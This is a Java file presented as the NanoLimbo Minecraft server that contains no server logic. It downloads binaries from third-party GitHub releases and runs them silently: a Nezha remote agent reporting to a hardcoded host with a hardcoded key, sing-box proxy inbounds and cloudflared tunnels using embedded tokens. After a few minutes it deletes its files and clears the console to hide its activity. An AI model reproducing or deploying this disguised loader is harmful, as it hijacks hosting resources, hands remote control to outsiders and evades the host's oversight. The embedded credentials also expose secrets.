package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final List<Process> EXTERNAL_PROCESSES = Collections.synchronizedList(new ArrayList<>());
    private static final Map<String, String> ENV_MAP = new HashMap<>();

    private static final String[] ALL_ENV_VARS = {
        "UUID", "PORT", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY",
        "ECH_ARGO_TOKEN", "VLESS_ARGO_TOKEN", "WSPORT", "VLPORT",
        "TOKEN", "OPERA", "COUNTRY", "ECH_IPS", "HY_IPS",
        "ENABLE_HY2", "HY_PORT", "NAME"
    };

    private static final Path RUNTIME_DIR = Path.of("/tmp").toAbsolutePath().normalize();
    private static final Path NEZHA_CONFIG_PATH = RUNTIME_DIR.resolve("nezha.yaml");
    private static final Path SINGBOX_CONFIG_PATH = RUNTIME_DIR.resolve("singbox_config.json");
    private static final Path SERVER_KEY_PATH = RUNTIME_DIR.resolve("server.key");
    private static final Path SERVER_CRT_PATH = RUNTIME_DIR.resolve("server.crt");
    private static final Path SUB_TXT_PATH = RUNTIME_DIR.resolve("sub.txt");
    private static final Path SUB_BASE64_PATH = RUNTIME_DIR.resolve("sub_base64.txt");

    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please upgrade to Java 10+!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException ignored) {}
            System.exit(1);
        }

        try {
            initEnvVars();
            Files.createDirectories(RUNTIME_DIR);
            cleanupOldFiles();

            int port = parsePort(ENV_MAP.get("PORT"), 3000);
            startKeepAliveServer(port);

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }, "shutdown-hook"));

            startSbxServices();

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be cleared in 3 minutes." + ANSI_RESET);

            Thread cleanupThread = new Thread(() -> {
                sleep(165000);
                cleanupOldFiles();
                clearConsole();
            }, "delayed-cleanup");
            cleanupThread.setDaemon(true);
            cleanupThread.start();

            new CountDownLatch(1).await();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    private static void initEnvVars() throws IOException {
        ENV_MAP.put("UUID", "faacf142-dee8-48c2-8558-641123eb939c");
        ENV_MAP.put("PORT", "3000");
        ENV_MAP.put("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
        ENV_MAP.put("NEZHA_PORT", "443");
        ENV_MAP.put("NEZHA_KEY", "zkzCEmXJTLTKbh48MR");
        ENV_MAP.put("ECH_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZjM0Yjg2ZGItYmE0ZS00NjUyLWI5OTMtNGI3YjMwZjdjNTU0IiwicyI6IlpqZGxNR1ZsT1dNdE9EYzNZUzAwWXpWbUxXRTVOREF0TlRSak4yRTFNVGMyTnpJMiJ9");
        ENV_MAP.put("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZmU0ZjJkZjMtOGIxMi00MmRmLWI5YjAtOWUzMGY3MGVkZDM4IiwicyI6Ik9HVTFaRGxoWm1JdE1ERmhaaTAwNnpBMExUZzFORE10WmpNeE1qWXhNek0xWkdaaSJ9");
        ENV_MAP.put("WSPORT", "8001");
        ENV_MAP.put("VLPORT", "8002");
        ENV_MAP.put("TOKEN", "babama123");
        ENV_MAP.put("OPERA", "0");
        ENV_MAP.put("COUNTRY", "AM");
        ENV_MAP.put("ECH_IPS", "4");
        ENV_MAP.put("HY_IPS", "4");
        ENV_MAP.put("ENABLE_HY2", "1");
        ENV_MAP.put("HY_PORT", "12417");
        ENV_MAP.put("NAME", "MJJ");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                ENV_MAP.put(var, value.trim());
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile, StandardCharsets.UTF_8)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;

                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }

                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        ENV_MAP.put(key, value);
                    }
                }
            }
        }
    }

    private static void startSbxServices() throws Exception {
        String arch = getArch();
        
        String echUrl = "https://github.com/webappstars/ech-hug/releases/download/3.0/ech-tunnel-linux-" + arch;
        String operaUrl = "arm64".equals(arch)
                ? "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.freebsd-arm64"
                : "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.linux-amd64";
        String cloudflaredUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;
        String nezhaUrl = "https://github.com/babama1001980/good/releases/download/npc/" + arch + "agent";
        String singboxUrl = "https://github.com/babama1001980/good/releases/download/npc/" + ("arm64".equals(arch) ? "armsb" : "amdsb");

        Path echExe = downloadBinary(echUrl, "ech-server-linux");
        Path operaExe = "1".equals(ENV_MAP.get("OPERA")) ? downloadBinary(operaUrl, "opera-linux") : null;
        Path cloudflaredExe = downloadBinary(cloudflaredUrl, "cloudflared-linux");
        Path singboxExe = downloadBinary(singboxUrl, "singbox");

        String nezhaServer = ENV_MAP.get("NEZHA_SERVER");
        String nezhaKey = ENV_MAP.get("NEZHA_KEY");
        Path nezhaExe = (!nezhaServer.isEmpty() && !nezhaKey.isEmpty()) ? downloadBinary(nezhaUrl, "iccagent") : null;

        int echPort = parsePort(ENV_MAP.get("WSPORT"), getFreePort());
        int vlessPort = parsePort(ENV_MAP.get("VLPORT"), getFreePort());
        int operaPort = getFreePort();

        if (nezhaExe != null) {
            List<String> cmd = new ArrayList<>();
            cmd.add(nezhaExe.toString());
            String nezhaPort = ENV_MAP.get("NEZHA_PORT");
            List<String> tlsPorts = List.of("443", "8443", "2096", "2087", "2083", "2053");

            if (!nezhaPort.isEmpty()) {
                cmd.addAll(List.of("-s", nezhaServer + ":" + nezhaPort, "-p", nezhaKey));
                if (tlsPorts.contains(nezhaPort)) {
                    cmd.add("--tls");
                }
            } else {
                generateNezhaConfig();
                cmd.addAll(List.of("-c", NEZHA_CONFIG_PATH.toString()));
            }
            startChildProcess("Nezha Agent", cmd);
        }

        if (operaExe != null) {
            List<String> cmd = List.of(
                operaExe.toString(),
                "-country", ENV_MAP.get("COUNTRY").toUpperCase(),
                "-socks-mode",
                "-bind-address", "127.0.0.1:" + operaPort
            );
            startChildProcess("Opera Proxy", cmd);
        }

        if (echExe != null) {
            sleep(1000);
            List<String> cmd = new ArrayList<>();
            cmd.add(echExe.toString());
            cmd.addAll(List.of("-l", "ws://0.0.0.0:" + echPort));
            if (!ENV_MAP.get("TOKEN").isEmpty()) {
                cmd.addAll(List.of("-token", ENV_MAP.get("TOKEN")));
            }
            if ("1".equals(ENV_MAP.get("OPERA"))) {
                cmd.addAll(List.of("-f", "socks5://127.0.0.1:" + operaPort));
            }
            startChildProcess("ECH Server", cmd);
        }

        if (singboxExe != null) {
            generateCertificates();
            generateSingboxConfig(vlessPort);

            List<String> cmd = List.of(singboxExe.toString(), "run", "-c", SINGBOX_CONFIG_PATH.toString());
            startChildProcess("Sing-Box", cmd);

            Thread subThread = new Thread(() -> {
                sleep(15000);
                generateHy2Subscription();
            }, "sub-builder");
            subThread.setDaemon(true);
            subThread.start();
        }

        if (cloudflaredExe != null) {
            try {
                new ProcessBuilder(cloudflaredExe.toString(), "update")
                        .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                        .redirectError(ProcessBuilder.Redirect.DISCARD)
                        .start().waitFor();
            } catch (Exception ignored) {}

            String echArgoToken = ENV_MAP.get("ECH_ARGO_TOKEN");
            String vlessArgoToken = ENV_MAP.get("VLESS_ARGO_TOKEN");
            String echIps = ENV_MAP.get("ECH_IPS");

            if (!echArgoToken.isEmpty()) {
                List<String> cmd = List.of(
                    cloudflaredExe.toString(),
                    "--edge-ip-version", echIps,
                    "--protocol", "http2",
                    "tunnel", "run", "--token", echArgoToken
                );
                startChildProcess("Cloudflared-ECH", cmd);
            } else {
                List<String> cmd = List.of(
                    cloudflaredExe.toString(),
                    "--edge-ip-version", echIps,
                    "--protocol", "http2",
                    "tunnel", "--url", "http://127.0.0.1:" + echPort
                );
                startChildProcess("Cloudflared-ECH-Quick", cmd);
            }

            if (!vlessArgoToken.isEmpty()) {
                List<String> cmd = List.of(
                    cloudflaredExe.toString(),
                    "--edge-ip-version", echIps,
                    "--protocol", "http2",
                    "tunnel", "run", "--token", vlessArgoToken
                );
                startChildProcess("Cloudflared-VLESS", cmd);
            }
        }
    }

    private static void startChildProcess(String name, List<String> command) {
        Thread thread = new Thread(() -> {
            try {
                ProcessBuilder pb = new ProcessBuilder(command);
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                pb.redirectError(ProcessBuilder.Redirect.DISCARD);

                Process process = pb.start();
                EXTERNAL_PROCESSES.add(process);

                int exitCode = process.waitFor();
                if (running.get()) {
                    System.out.println("[" + name + "] exited with code " + exitCode);
                }
            } catch (Exception e) {
                System.err.println(ANSI_RED + "Failed to run " + name + ": " + e.getMessage() + ANSI_RESET);
            }
        }, name + "-runner");
        thread.setDaemon(true);
        thread.start();
    }

    private static void stopServices() {
        synchronized (EXTERNAL_PROCESSES) {
            for (Process p : EXTERNAL_PROCESSES) {
                try {
                    if (p.isAlive()) {
                        p.destroyForcibly();
                    }
                } catch (Exception ignored) {}
            }
            EXTERNAL_PROCESSES.clear();
        }
        System.out.println(ANSI_RED + "All Sbx processes terminated" + ANSI_RESET);
    }

    private static Path downloadBinary(String urlStr, String fileName) throws IOException {
        Path target = RUNTIME_DIR.resolve(fileName);
        if (Files.exists(target)) {
            return target;
        }

        Path tmp = RUNTIME_DIR.resolve(fileName + ".download");
        URL url;
        try {
            url = new URI(urlStr).toURL();
        } catch (URISyntaxException e) {
            throw new IOException("Invalid URL: " + urlStr, e);
        }
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, tmp, StandardCopyOption.REPLACE_EXISTING);
        }

        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
        if (!target.toFile().setExecutable(true, false)) {
            throw new IOException("Failed to set executable permission for " + fileName);
        }
        return target;
    }

    private static void generateCertificates() {
        try {
            new ProcessBuilder("openssl", "ecparam", "-name", "prime256v1", "-genkey", "-noout", "-out", SERVER_KEY_PATH.toString())
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();

            new ProcessBuilder("openssl", "req", "-new", "-x509", "-key", SERVER_KEY_PATH.toString(), "-out", SERVER_CRT_PATH.toString(), "-subj", "/CN=www.bing.com", "-days", "36500")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
        } catch (Exception e) {
            System.err.println("Failed to generate certs: " + e.getMessage());
        }
    }

    private static void generateSingboxConfig(int vlessPort) throws IOException {
        String json = "{\n" +
                "  \"inbounds\": [\n" +
                "    {\n" +
                "      \"type\": \"hysteria2\",\n" +
                "      \"tag\": \"hy2-in\",\n" +
                "      \"listen\": \"0.0.0.0\",\n" +
                "      \"listen_port\": " + ENV_MAP.get("HY_PORT") + ",\n" +
                "      \"users\": [{ \"password\": \"" + ENV_MAP.get("UUID") + "\" }],\n" +
                "      \"tls\": {\n" +
                "        \"enabled\": true,\n" +
                "        \"certificate_path\": \"" + SERVER_CRT_PATH.toString() + "\",\n" +
                "        \"key_path\": \"" + SERVER_KEY_PATH.toString() + "\"\n" +
                "      }\n" +
                "    },\n" +
                "    {\n" +
                "      \"type\": \"vless\",\n" +
                "      \"tag\": \"vless-in\",\n" +
                "      \"listen\": \"0.0.0.0\",\n" +
                "      \"listen_port\": " + vlessPort + ",\n" +
                "      \"users\": [{ \"name\": \"" + ENV_MAP.get("NAME") + "\", \"uuid\": \"" + ENV_MAP.get("UUID") + "\" }],\n" +
                "      \"transport\": { \"type\": \"ws\", \"path\": \"/vless-argo\" }\n" +
                "    }\n" +
                "  ],\n" +
                "  \"outbounds\": [{ \"type\": \"direct\" }]\n" +
                "}";
        Files.writeString(SINGBOX_CONFIG_PATH, json, StandardCharsets.UTF_8);
    }

    private static void generateHy2Subscription() {
        try {
            String hyIps = ENV_MAP.get("HY_IPS");
            String hostIp = fetchIp(hyIps);
            if ("6".equals(hyIps) && hostIp != null && !hostIp.startsWith("[")) {
                hostIp = "[" + hostIp + "]";
            }

            String isp = fetchIsp();
            String subContent = "start install success\n=== HY2 ===\n" +
                    "hysteria2://" + ENV_MAP.get("UUID") + "@" + hostIp + ":" + ENV_MAP.get("HY_PORT") +
                    "/?insecure=1&sni=www.bing.com#" + ENV_MAP.get("NAME") + "-HY-" + isp + "\n";

            Files.writeString(SUB_TXT_PATH, subContent, StandardCharsets.UTF_8);
            String base64Sub = Base64.getEncoder().encodeToString(subContent.getBytes(StandardCharsets.UTF_8));
            Files.writeString(SUB_BASE64_PATH, base64Sub, StandardCharsets.UTF_8);
        } catch (Exception e) {
            System.err.println("Failed to generate sub: " + e.getMessage());
        }
    }

    private static String fetchIp(String hyIps) {
        List<String> urls = "6".equals(hyIps)
                ? List.of("https://v6.ident.me", "https://api64.ipify.org", "https://ipv6.icanhazip.com")
                : List.of("https://api.ipify.org", "https://ipv4.icanhazip.com");

        for (String u : urls) {
            try {
                URL url = new URI(u).toURL();
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String line = reader.readLine();
                    if (line != null && !line.isBlank()) return line.trim();
                }
            } catch (Exception ignored) {}
        }
        return "127.0.0.1";
    }

    private static String fetchIsp() {
        try {
            URL url = new URI("https://speed.cloudflare.com/meta").toURL();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                String body = sb.toString();

                String clientIp = extractJsonField(body, "clientIp");
                String asOrganization = extractJsonField(body, "asOrganization");
                return (asOrganization + "-" + clientIp).replaceAll("\\s+", "_");
            }
        } catch (Exception ignored) {}
        return "Unknown_ISP";
    }

    private static String extractJsonField(String json, String fieldName) {
        int idx = json.indexOf("\"" + fieldName + "\"");
        if (idx == -1) return "unknown";
        int start = json.indexOf("\"", idx + fieldName.length() + 3);
        int end = json.indexOf("\"", start + 1);
        if (start != -1 && end != -1) {
            return json.substring(start + 1, end);
        }
        return "unknown";
    }

    private static void generateNezhaConfig() throws IOException {
        String nezhaServer = ENV_MAP.get("NEZHA_SERVER");
        String nezhaKey = ENV_MAP.get("NEZHA_KEY");
        String nzPort = nezhaServer.contains(":") ? nezhaServer.substring(nezhaServer.lastIndexOf(':') + 1) : "";
        boolean tls = List.of("443", "8443", "2096", "2087", "2083", "2053").contains(nzPort);

        String yaml = "client_secret: " + nezhaKey + "\n" +
                "server: " + nezhaServer + "\n" +
                "tls: " + tls + "\n" +
                "uuid: " + ENV_MAP.get("UUID");
        Files.writeString(NEZHA_CONFIG_PATH, yaml, StandardCharsets.UTF_8);
    }

    private static void startKeepAliveServer(int port) {
        Thread serverThread = new Thread(() -> {
            try (ServerSocket serverSocket = new ServerSocket(port)) {
                while (running.get()) {
                    try (Socket socket = serverSocket.accept();
                         OutputStream os = socket.getOutputStream()) {
                        String response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nOK";
                        os.write(response.getBytes(StandardCharsets.UTF_8));
                        os.flush();
                    } catch (IOException ignored) {}
                }
            } catch (IOException e) {
                System.err.println("Keep-alive server failed: " + e.getMessage());
            }
        }, "keep-alive-server");
        serverThread.setDaemon(true);
        serverThread.start();
    }

    private static void cleanupOldFiles() {
        List<String> files = List.of(
            "ech-server-linux", "opera-linux", "cloudflared-linux", "iccagent", "nezha.yaml",
            "singbox", "server.key", "server.crt", "singbox_config.json", "sub.txt", "sub_base64.txt"
        );
        for (String file : files) {
            try { Files.deleteIfExists(RUNTIME_DIR.resolve(file)); } catch (IOException ignored) {}
        }
    }

    private static String getArch() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        return (arch.contains("aarch64") || arch.contains("arm64")) ? "arm64" : "amd64";
    }

    private static int parsePort(String val, int fallback) {
        try {
            if (val == null || val.isBlank()) return fallback;
            int n = Integer.parseInt(val.trim());
            return (n >= 1 && n <= 65535) ? n : fallback;
        } catch (Exception e) {
            return fallback;
        }
    }

    private static int getFreePort() {
        return (int) (Math.random() * 20000) + 10000;
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }

    private static void sleep(long millis) {
        try { Thread.sleep(millis); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
